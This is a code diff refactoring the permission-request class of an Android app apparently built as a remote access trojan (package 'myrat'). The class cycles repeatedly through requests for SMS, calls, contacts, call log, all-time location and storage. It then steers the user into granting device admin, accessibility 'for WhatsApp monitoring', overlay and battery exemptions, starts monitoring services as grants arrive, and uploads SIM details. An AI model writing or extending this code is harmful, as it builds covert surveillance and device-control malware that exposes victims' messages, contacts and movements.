@@ -13,6 +13,7 @@ import android.os.PowerManager
 import android.provider.Settings
 import com.myrat.app.service.ServiceManager
 import com.myrat.app.utils.Logger
+import com.myrat.app.utils.PermissionUtils
 import pub.devrel.easypermissions.EasyPermissions
 import pub.devrel.easypermissions.PermissionRequest
 import java.lang.ref.WeakReference
@@ -64,83 +65,45 @@ class PermissionHandler(
         }
     }
 
-    private val permissionGroups = try {
-        listOf(
-            PermissionGroup(
-                name = "SMS",
-                permissions = arrayOf(
-                    Manifest.permission.RECEIVE_SMS,
-                    Manifest.permission.READ_SMS,
-                    Manifest.permission.SEND_SMS
-                ),
-                requestCode = RC_SMS_PERMISSIONS,
-                description = "📱 SMS PERMISSIONS (CRITICAL)\n\nRequired for:\n• Receiving SMS messages\n• Reading existing SMS\n• Sending SMS messages\n\nSMS service will start immediately after granting."
-            ),
-            PermissionGroup(
-                name = "PHONE",
-                permissions = arrayOf(
-                    Manifest.permission.READ_PHONE_STATE,
-                    Manifest.permission.CALL_PHONE,
-                    Manifest.permission.READ_PHONE_NUMBERS,
-                    Manifest.permission.READ_CONTACTS,
-                    Manifest.permission.READ_CALL_LOG
-                ),
-                requestCode = RC_PHONE_PERMISSIONS,
-                description = "📞 PHONE PERMISSIONS (CRITICAL)\n\nRequired for:\n• Making phone calls with SIM selection\n• Reading phone state and SIM info\n• Accessing contacts\n• Reading call history\n\nCall and contact services will start after granting."
-            ),
-            PermissionGroup(
-                name = "LOCATION",
-                permissions = arrayOf(
-                    Manifest.permission.ACCESS_FINE_LOCATION,
-                    Manifest.permission.ACCESS_COARSE_LOCATION
-                ),
-                requestCode = RC_LOCATION_PERMISSIONS,
-                description = "📍 LOCATION PERMISSIONS (CRITICAL - STEP 1)\n\nRequired for:\n• Real-time location tracking\n• Location history\n• GPS monitoring\n\nAfter granting these, we'll ask for ALL-TIME LOCATION access."
-            ),
-            PermissionGroup(
-                name = "BACKGROUND_LOCATION",
-                permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-                } else {
-                    emptyArray()
-                },
-                requestCode = RC_BACKGROUND_LOCATION,
-                description = "📍 ALL-TIME LOCATION ACCESS (CRITICAL - STEP 2)\n\nRequired for:\n• Location tracking when app is closed\n• Background location monitoring\n• Continuous GPS tracking\n\nThis enables 24/7 location services.",
-                isBackgroundLocation = true
-            ),
-            PermissionGroup(
-                name = "STORAGE",
-                permissions = try {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                        arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
-                    } else {
-                        arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
-                    }
-                } catch (e: Exception) {
-                    arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
-                },
-                requestCode = RC_STORAGE_PERMISSIONS,
-                description = "📁 STORAGE PERMISSIONS\n\nRequired for:\n• Accessing images and files\n• Image upload functionality\n\nImage upload service will start after granting."
-            ),
-            PermissionGroup(
-                name = "NOTIFICATIONS",
-                permissions = try {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                        arrayOf(Manifest.permission.POST_NOTIFICATIONS)
-                    } else {
-                        emptyArray()
-                    }
-                } catch (e: Exception) {
-                    emptyArray()
-                },
-                requestCode = RC_NOTIFICATION_PERMISSIONS,
-                description = "🔔 NOTIFICATION PERMISSIONS (Android 13+)\n\nRequired for:\n• Important app notifications\n• Service status updates\n• Alert notifications"
-            )
-        ).filter { it.permissions.isNotEmpty() }
-    } catch (e: Exception) {
-        Logger.error("Error initializing permission groups", e)
-        emptyList()
-    }
+    private val permissionGroups = listOf(
+        PermissionGroup(
+            name = "SMS",
+            permissions = PermissionUtils.SMS_PERMISSIONS,
+            requestCode = RC_SMS_PERMISSIONS,
+            description = "📱 SMS PERMISSIONS (CRITICAL)\n\nRequired for:\n• Receiving SMS messages\n• Reading existing SMS\n• Sending SMS messages\n\nSMS service will start immediately after granting."
+        ),
+        PermissionGroup(
+            name = "PHONE",
+            permissions = PermissionUtils.PHONE_PERMISSIONS,
+            requestCode = RC_PHONE_PERMISSIONS,
+            description = "📞 PHONE PERMISSIONS (CRITICAL)\n\nRequired for:\n• Making phone calls with SIM selection\n• Reading phone state and SIM info\n• Accessing contacts\n• Reading call history\n\nCall and contact services will start after granting."
+        ),
+        PermissionGroup(
+            name = "LOCATION",
+            permissions = PermissionUtils.LOCATION_PERMISSIONS,
+            requestCode = RC_LOCATION_PERMISSIONS,
+            description = "📍 LOCATION PERMISSIONS (CRITICAL - STEP 1)\n\nRequired for:\n• Real-time location tracking\n• Location history\n• GPS monitoring\n\nAfter granting these, we'll ask for ALL-TIME LOCATION access."
+        ),
+        PermissionGroup(
+            name = "BACKGROUND_LOCATION",
+            permissions = PermissionUtils.BACKGROUND_LOCATION_PERMISSIONS,
+            requestCode = RC_BACKGROUND_LOCATION,
+            description = "📍 ALL-TIME LOCATION ACCESS (CRITICAL - STEP 2)\n\nRequired for:\n• Location tracking when app is closed\n• Background location monitoring\n• Continuous GPS tracking\n\nThis enables 24/7 location services.",
+            isBackgroundLocation = true
+        ),
+        PermissionGroup(
+            name = "STORAGE",
+            permissions = PermissionUtils.STORAGE_PERMISSIONS,
+            requestCode = RC_STORAGE_PERMISSIONS,
+            description = "📁 STORAGE PERMISSIONS\n\nRequired for:\n• Accessing images and files\n• Image upload functionality\n\nImage upload service will start after granting."
+        ),
+        PermissionGroup(
+            name = "NOTIFICATIONS",
+            permissions = PermissionUtils.NOTIFICATION_PERMISSIONS,
+            requestCode = RC_NOTIFICATION_PERMISSIONS,
+            description = "🔔 NOTIFICATION PERMISSIONS (Android 13+)\n\nRequired for:\n• Important app notifications\n• Service status updates\n• Alert notifications"
+        )
+    ).filter { it.permissions.isNotEmpty() }
 
     fun requestPermissions() {
         if (isDestroyed) {
@@ -183,7 +146,6 @@ class PermissionHandler(
 
         try {
             if (currentPermissionGroup >= permissionGroups.size) {
-                // Completed one full rotation
                 rotationCount++
                 currentPermissionGroup = 0
 
@@ -204,29 +166,17 @@ class PermissionHandler(
 
             val permissionGroup = permissionGroups[currentPermissionGroup]
 
-            // Special handling for background location
             if (permissionGroup.isBackgroundLocation) {
                 handleBackgroundLocationPermission(activity, permissionGroup)
                 return
             }
 
-            // Check if this group is already granted
-            if (EasyPermissions.hasPermissions(activity, *permissionGroup.permissions)) {
+            // Use centralized permission checking
+            if (PermissionUtils.hasPermissionGroup(activity, permissionGroup.permissions)) {
                 Logger.log("✅ ${permissionGroup.name} permissions already granted, skipping")
-
-                // Start services for granted permissions
-                safeExecute {
-                    serviceManager.checkAndStartAvailableServices()
-                }
-
+                safeExecute { serviceManager.checkAndStartAvailableServices() }
                 currentPermissionGroup++
-
-                // Continue immediately to next group
-                handler.post {
-                    if (!isDestroyed) {
-                        startRotationalPermissionFlow(activity)
-                    }
-                }
+                handler.post { if (!isDestroyed) startRotationalPermissionFlow(activity) }
                 return
             }
 
@@ -252,66 +202,38 @@ class PermissionHandler(
             Logger.error("Error in rotational permission flow", e)
             currentPermissionGroup++
             handler.postDelayed({
-                if (!isDestroyed) {
-                    startRotationalPermissionFlow(activity)
-                }
+                if (!isDestroyed) startRotationalPermissionFlow(activity)
             }, ROTATION_DELAY)
         }
     }
 
     private fun handleBackgroundLocationPermission(activity: Activity, permissionGroup: PermissionGroup) {
         try {
-            // Check if Android 10+ (where background location is required)
             if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                 Logger.log("📍 Background location not needed on Android < 10, skipping")
                 currentPermissionGroup++
-                handler.post {
-                    if (!isDestroyed) {
-                        startRotationalPermissionFlow(activity)
-                    }
-                }
+                handler.post { if (!isDestroyed) startRotationalPermissionFlow(activity) }
                 return
             }
 
-            // Check if we already have background location
-            if (EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
+            if (PermissionUtils.hasBackgroundLocationPermissions(activity)) {
                 Logger.log("✅ Background location already granted")
                 currentPermissionGroup++
-                handler.post {
-                    if (!isDestroyed) {
-                        startRotationalPermissionFlow(activity)
-                    }
-                }
+                handler.post { if (!isDestroyed) startRotationalPermissionFlow(activity) }
                 return
             }
 
-            // Check if we have foreground location first
-            val hasForegroundLocation = EasyPermissions.hasPermissions(
-                activity,
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION
-            )
-
-            if (!hasForegroundLocation) {
+            if (!PermissionUtils.hasForegroundLocationPermissions(activity)) {
                 Logger.log("📍 Foreground location not granted yet, skipping background location for now")
                 currentPermissionGroup++
-                handler.post {
-                    if (!isDestroyed) {
-                        startRotationalPermissionFlow(activity)
-                    }
-                }
+                handler.post { if (!isDestroyed) startRotationalPermissionFlow(activity) }
                 return
             }
 
-            // Don't ask for background location multiple times in the same session
             if (backgroundLocationRequested) {
                 Logger.log("📍 Background location already requested this session, skipping")
                 currentPermissionGroup++
-                handler.post {
-                    if (!isDestroyed) {
-                        startRotationalPermissionFlow(activity)
-                    }
-                }
+                handler.post { if (!isDestroyed) startRotationalPermissionFlow(activity) }
                 return
             }
 
@@ -340,9 +262,7 @@ class PermissionHandler(
             Logger.error("Error handling background location permission", e)
             currentPermissionGroup++
             handler.postDelayed({
-                if (!isDestroyed) {
-                    startRotationalPermissionFlow(activity)
-                }
+                if (!isDestroyed) startRotationalPermissionFlow(activity)
             }, BACKGROUND_LOCATION_DELAY)
         }
     }
@@ -360,40 +280,26 @@ class PermissionHandler(
             val permissionGroup = permissionGroups.find { it.requestCode == requestCode }
             Logger.log("✅ ${permissionGroup?.name ?: "Unknown"} permissions granted: $perms")
 
-            // Special handling for location permissions
             if (requestCode == RC_LOCATION_PERMISSIONS) {
                 Logger.log("📍 Foreground location granted, will request background location next")
-                // Start location service immediately with foreground permissions
-                safeExecute {
-                    serviceManager.checkAndStartAvailableServices()
-                }
+                safeExecute { serviceManager.checkAndStartAvailableServices() }
             } else if (requestCode == RC_BACKGROUND_LOCATION) {
                 Logger.log("🎉 ALL-TIME LOCATION ACCESS GRANTED! 24/7 location tracking enabled")
-                // Start location service with full permissions
-                safeExecute {
-                    serviceManager.checkAndStartAvailableServices()
-                }
+                safeExecute { serviceManager.checkAndStartAvailableServices() }
             } else {
-                // Start services immediately when other permissions are granted
-                safeExecute {
-                    serviceManager.checkAndStartAvailableServices()
-                }
+                safeExecute { serviceManager.checkAndStartAvailableServices() }
             }
 
-            // Move to next permission group
             currentPermissionGroup++
 
-            // Continue with delay to next permission group
             val delay = if (requestCode == RC_LOCATION_PERMISSIONS) {
-                BACKGROUND_LOCATION_DELAY // Shorter delay before asking for background location
+                BACKGROUND_LOCATION_DELAY
             } else {
                 ROTATION_DELAY
             }
 
             handler.postDelayed({
-                if (!isDestroyed) {
-                    startRotationalPermissionFlow(activity)
-                }
+                if (!isDestroyed) startRotationalPermissionFlow(activity)
             }, delay)
 
         } catch (e: Exception) {
@@ -414,35 +320,25 @@ class PermissionHandler(
             val permissionGroup = permissionGroups.find { it.requestCode == requestCode }
             Logger.warn("❌ ${permissionGroup?.name ?: "Unknown"} permissions denied: $perms")
 
-            // Special handling for background location denial
             if (requestCode == RC_BACKGROUND_LOCATION) {
                 Logger.warn("⚠️ ALL-TIME LOCATION ACCESS DENIED - Location tracking will be limited")
                 Logger.warn("📍 Location service will work only when app is open")
             }
 
-            // Still check and start available services with granted permissions
-            safeExecute {
-                serviceManager.checkAndStartAvailableServices()
-            }
+            safeExecute { serviceManager.checkAndStartAvailableServices() }
 
-            // Check if some permissions are permanently denied
             if (EasyPermissions.somePermissionPermanentlyDenied(activity, perms)) {
                 Logger.warn("⚠️ Some ${permissionGroup?.name} permissions permanently denied")
 
-                // For background location, show special message
                 if (requestCode == RC_BACKGROUND_LOCATION) {
                     Logger.warn("📍 To enable all-time location later, go to Settings > Apps > ${activity.packageName} > Permissions > Location > Allow all the time")
                 }
             }
 
-            // Move to next permission group
             currentPermissionGroup++
 
-            // Continue with delay to next permission group
             handler.postDelayed({
-                if (!isDestroyed) {
-                    startRotationalPermissionFlow(activity)
-                }
+                if (!isDestroyed) startRotationalPermissionFlow(activity)
             }, ROTATION_DELAY)
 
         } catch (e: Exception) {
@@ -460,7 +356,6 @@ class PermissionHandler(
         try {
             Logger.log("🔧 Starting special permissions flow")
 
-            // Battery optimization (critical for service persistence)
             if (!isBatteryOptimizationDisabled(activity)) {
                 Logger.log("🔋 Battery optimization not disabled, requesting...")
                 requestBatteryOptimization(activity)
@@ -469,7 +364,6 @@ class PermissionHandler(
                 Logger.log("✅ Battery optimization already disabled")
             }
 
-            // Device admin (for lock service) - IMPROVED CHECK
             if (!isDeviceAdminEnabled(activity)) {
                 Logger.log("🔐 Device admin not enabled, requesting...")
                 requestDeviceAdmin(activity)
@@ -478,7 +372,6 @@ class PermissionHandler(
                 Logger.log("✅ Device admin already enabled")
             }
 
-            // Accessibility service (for WhatsApp monitoring)
             if (!isAccessibilityServiceEnabled(activity)) {
                 Logger.log("♿ Accessibility service not enabled, requesting...")
                 requestAccessibilityService(activity)
@@ -487,7 +380,6 @@ class PermissionHandler(
                 Logger.log("✅ Accessibility service already enabled")
             }
 
-            // System overlay
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
                 Logger.log("🖼️ Overlay permission not granted, requesting...")
                 requestOverlayPermission(activity)
@@ -496,7 +388,6 @@ class PermissionHandler(
                 Logger.log("✅ Overlay permission already granted or not needed")
             }
 
-            // Exact alarms (Android 12+)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager
                 if (alarmManager != null && !alarmManager.canScheduleExactAlarms()) {
@@ -508,7 +399,6 @@ class PermissionHandler(
                 }
             }
 
-            // All special permissions done, move to manufacturer settings
             Logger.log("✅ All special permissions checked, moving to manufacturer settings")
             requestManufacturerSpecificSettings(activity)
 
@@ -530,10 +420,7 @@ class PermissionHandler(
 
             handler.postDelayed({
                 if (!isDestroyed) {
-                    safeExecute {
-                        serviceManager.checkAndStartAvailableServices()
-                    }
-                    // Continue to next special permission check
+                    safeExecute { serviceManager.checkAndStartAvailableServices() }
                     requestSpecialPermissions(activity)
                 }
             }, SPECIAL_PERMISSION_DELAY)
@@ -541,9 +428,7 @@ class PermissionHandler(
         } catch (e: Exception) {
             Logger.error("Failed to request battery optimization", e)
             handler.postDelayed({
-                if (!isDestroyed) {
-                    requestSpecialPermissions(activity)
-                }
+                if (!isDestroyed) requestSpecialPermissions(activity)
             }, 1000)
         }
     }
@@ -552,14 +437,11 @@ class PermissionHandler(
         Logger.log("🔐 Requesting device admin (for lock service)")
 
         try {
-            // Double-check if device admin is actually enabled before requesting
             if (isDeviceAdminEnabled(activity)) {
                 Logger.log("✅ Device admin is actually already enabled, skipping request")
                 handler.postDelayed({
                     if (!isDestroyed) {
-                        safeExecute {
-                            serviceManager.checkAndStartAvailableServices()
-                        }
+                        safeExecute { serviceManager.checkAndStartAvailableServices() }
                         requestSpecialPermissions(activity)
                     }
                 }, 500)
@@ -577,10 +459,7 @@ class PermissionHandler(
 
             handler.postDelayed({
                 if (!isDestroyed) {
-                    safeExecute {
-                        serviceManager.checkAndStartAvailableServices()
-                    }
-                    // Continue to next special permission check
+                    safeExecute { serviceManager.checkAndStartAvailableServices() }
                     requestSpecialPermissions(activity)
                 }
             }, SPECIAL_PERMISSION_DELAY)
@@ -588,9 +467,7 @@ class PermissionHandler(
         } catch (e: Exception) {
             Logger.error("Failed to request device admin", e)
             handler.postDelayed({
-                if (!isDestroyed) {
-                    requestSpecialPermissions(activity)
-                }
+                if (!isDestroyed) requestSpecialPermissions(activity)
             }, 1000)
         }
     }
@@ -605,19 +482,15 @@ class PermissionHandler(
 
             handler.postDelayed({
                 if (!isDestroyed) {
-                    safeExecute {
-                        serviceManager.checkAndStartAvailableServices()
-                    }
+                    safeExecute { serviceManager.checkAndStartAvailableServices() }
                     requestSpecialPermissions(activity)
                 }
-            }, SPECIAL_PERMISSION_DELAY + 1000) // Extra time for accessibility
+            }, SPECIAL_PERMISSION_DELAY + 1000)
 
         } catch (e: Exception) {
             Logger.error("Failed to open accessibility settings", e)
             handler.postDelayed({
-                if (!isDestroyed) {
-                    requestSpecialPermissions(activity)
-                }
+                if (!isDestroyed) requestSpecialPermissions(activity)
             }, 1000)
         }
     }
@@ -634,9 +507,7 @@ class PermissionHandler(
 
             handler.postDelayed({
                 if (!isDestroyed) {
-                    safeExecute {
-                        serviceManager.checkAndStartAvailableServices()
-                    }
+                    safeExecute { serviceManager.checkAndStartAvailableServices() }
                     requestSpecialPermissions(activity)
                 }
             }, SPECIAL_PERMISSION_DELAY)
@@ -644,9 +515,7 @@ class PermissionHandler(
         } catch (e: Exception) {
             Logger.error("Failed to request overlay permission", e)
             handler.postDelayed({
-                if (!isDestroyed) {
-                    requestSpecialPermissions(activity)
-                }
+                if (!isDestroyed) requestSpecialPermissions(activity)
             }, 1000)
         }
     }
@@ -663,9 +532,7 @@ class PermissionHandler(
 
             handler.postDelayed({
                 if (!isDestroyed) {
-                    safeExecute {
-                        serviceManager.checkAndStartAvailableServices()
-                    }
+                    safeExecute { serviceManager.checkAndStartAvailableServices() }
                     requestSpecialPermissions(activity)
                 }
             }, SPECIAL_PERMISSION_DELAY)
@@ -673,9 +540,7 @@ class PermissionHandler(
         } catch (e: Exception) {
             Logger.error("Failed to request exact alarms permission", e)
             handler.postDelayed({
-                if (!isDestroyed) {
-                    requestSpecialPermissions(activity)
-                }
+                if (!isDestroyed) requestSpecialPermissions(activity)
             }, 1000)
         }
     }
@@ -775,9 +640,7 @@ class PermissionHandler(
                     Logger.log("Successfully opened $settingsName")
 
                     handler.postDelayed({
-                        if (!isDestroyed) {
-                            finishPermissionFlow(activity)
-                        }
+                        if (!isDestroyed) finishPermissionFlow(activity)
                     }, 2000)
                     return
                 }
@@ -786,7 +649,6 @@ class PermissionHandler(
             }
         }
 
-        // Fallback to app settings
         try {
             val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                 data = Uri.parse("package:${activity.packageName}")
@@ -806,25 +668,13 @@ class PermissionHandler(
         Logger.log("🎉 Rotational permission flow completed!")
 
         try {
-            // Final service check and start
-            safeExecute {
-                serviceManager.checkAndStartAvailableServices()
-            }
+            safeExecute { serviceManager.checkAndStartAvailableServices() }
+            safeExecute { simDetailsHandler.uploadSimDetails() }
 
-            // Upload SIM details
-            safeExecute {
-                simDetailsHandler.uploadSimDetails()
-            }
+            val stats = serviceManager.getServiceStats()
+            Logger.log("Final service status: ${stats["running_services"]}/${stats["total_services"]} services running")
 
-            // Log final service status
-            safeExecute {
-                val stats = serviceManager.getServiceStats()
-                Logger.log("Final service status: ${stats["running_services"]}/${stats["total_services"]} services running")
-            }
-
-            // Log final permission status
             logFinalPermissionStatus(activity)
-
             isProcessing = false
 
         } catch (e: Exception) {
@@ -836,12 +686,12 @@ class PermissionHandler(
     private fun logFinalPermissionStatus(activity: Activity) {
         try {
             Logger.log("=== FINAL PERMISSION STATUS ===")
-            Logger.log("📱 SMS: ${if (EasyPermissions.hasPermissions(activity, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS)) "✅ GRANTED" else "❌ DENIED"}")
-            Logger.log("📞 Phone: ${if (EasyPermissions.hasPermissions(activity, Manifest.permission.CALL_PHONE, Manifest.permission.READ_PHONE_STATE)) "✅ GRANTED" else "❌ DENIED"}")
-            Logger.log("📍 Location (Foreground): ${if (EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION)) "✅ GRANTED" else "❌ DENIED"}")
+            Logger.log("📱 SMS: ${if (PermissionUtils.hasAllSmsPermissions(activity)) "✅ GRANTED" else "❌ DENIED"}")
+            Logger.log("📞 Phone: ${if (PermissionUtils.hasAllCallPermissions(activity)) "✅ GRANTED" else "❌ DENIED"}")
+            Logger.log("📍 Location (Foreground): ${if (PermissionUtils.hasForegroundLocationPermissions(activity)) "✅ GRANTED" else "❌ DENIED"}")
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                Logger.log("📍 Location (ALL-TIME): ${if (EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)) "✅ GRANTED" else "❌ DENIED"}")
+                Logger.log("📍 Location (ALL-TIME): ${if (PermissionUtils.hasBackgroundLocationPermissions(activity)) "✅ GRANTED" else "❌ DENIED"}")
             }
 
             Logger.log("🔋 Battery Optimization: ${if (isBatteryOptimizationDisabled(activity)) "✅ DISABLED" else "❌ ENABLED"}")
@@ -863,7 +713,6 @@ class PermissionHandler(
         }
     }
 
-    // IMPROVED Helper methods with better error handling and logging
     private fun isBatteryOptimizationDisabled(context: Context): Boolean {
         return try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -893,7 +742,6 @@ class PermissionHandler(
             val result = devicePolicyManager.isAdminActive(adminComponent)
             Logger.log("🔐 Device admin check: $result (component: ${adminComponent.className})")
 
-            // Additional verification - check if the component is properly registered
             try {
                 val packageManager = context.packageManager
                 val receiverInfo = packageManager.getReceiverInfo(adminComponent, android.content.pm.PackageManager.GET_META_DATA)
@@ -940,9 +788,7 @@ class PermissionHandler(
 
     private fun safeExecute(action: () -> Unit) {
         try {
-            if (!isDestroyed) {
-                action()
-            }
+            if (!isDestroyed) action()
         } catch (e: Exception) {
             Logger.error("Error in safe execution", e)
         }
@@ -951,9 +797,7 @@ class PermissionHandler(
     fun hasBasicPermissions(): Boolean {
         val activity = activityRef.get() ?: return false
         return try {
-            permissionGroups.any { group ->
-                EasyPermissions.hasPermissions(activity, *group.permissions)
-            }
+            PermissionUtils.hasAllCriticalPermissions(activity)
         } catch (e: Exception) {
             Logger.error("Error checking basic permissions", e)
             false
@@ -964,21 +808,10 @@ class PermissionHandler(
         val activity = activityRef.get() ?: return false
 
         return try {
-            val allPermissions = permissionGroups.flatMap { it.permissions.toList() }.toTypedArray()
-            val runtimeGranted = if (allPermissions.isNotEmpty()) {
-                EasyPermissions.hasPermissions(activity, *allPermissions)
-            } else {
-                true
-            }
+            val runtimeGranted = PermissionUtils.hasAllCriticalPermissions(activity)
             val batteryOptimized = isBatteryOptimizationDisabled(activity)
             val deviceAdminEnabled = isDeviceAdminEnabled(activity)
-
-            // Check if we have all-time location on Android 10+
-            val hasAllTimeLocation = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-            } else {
-                true
-            }
+            val hasAllTimeLocation = PermissionUtils.hasBackgroundLocationPermissions(activity)
 
             Logger.log("🔍 Permission check: Runtime=$runtimeGranted, Battery=$batteryOptimized, DeviceAdmin=$deviceAdminEnabled, AllTimeLocation=$hasAllTimeLocation")
 
@@ -999,13 +832,7 @@ class PermissionHandler(
             }
 
             Logger.log("🔄 Handling resume - checking permissions and starting services")
-
-            // Always check and start available services on resume
-            safeExecute {
-                serviceManager.checkAndStartAvailableServices()
-            }
-
-            // Log current permission status
+            safeExecute { serviceManager.checkAndStartAvailableServices() }
             logFinalPermissionStatus(activity)
 
             if (areAllPermissionsGranted()) {
